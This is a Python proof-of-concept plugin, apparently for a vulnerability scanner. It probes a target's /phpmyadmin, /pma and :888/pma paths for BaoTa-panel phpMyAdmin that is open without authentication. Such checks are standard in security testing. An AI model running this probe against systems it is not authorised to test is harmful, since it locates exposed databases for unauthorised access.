#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '宝塔phpmyadmin未授权访问',

      'level'     :   'high',
      'FOFA'      :   '',
      'author'    :   'ppxfx',
      'ifbug'     :   False,
  }
  return ret

def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  targets = ['/phpmyadmin','/pma',':888/pma']
  url1 = url + targets[0]
  url2 = url + targets[1]
  url3 = url + targets[2]
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and "网站服务器" in res.text and "数据库" in res.text and "information_schema" in res.text:
      res.close()
      ret['ifbug'] = True
      ret['url'] = url1
      return ret
  except:
    pass
  try:
    res2=requests.get(url=url2,headers=headers,timeout=5,verify=False)
    if res2.status_code == 200 and "网站服务器" in res2.text and "数据库" in res2.text and "information_schema" in res2.text:
      res2.close()
      ret['ifbug'] = True
      ret['url'] = url2
      return ret
  except:
    pass
  try:
    res3=requests.get(url=url3,headers=headers,timeout=5,verify=False)
    if res3.status_code == 200 and "网站服务器" in res3.text and "数据库" in res3.text and "information_schema" in res3.text:
      res3.close()
      ret['ifbug'] = True
      ret['url'] = url3
      return ret
    else:
      return ret
  except:
    return ret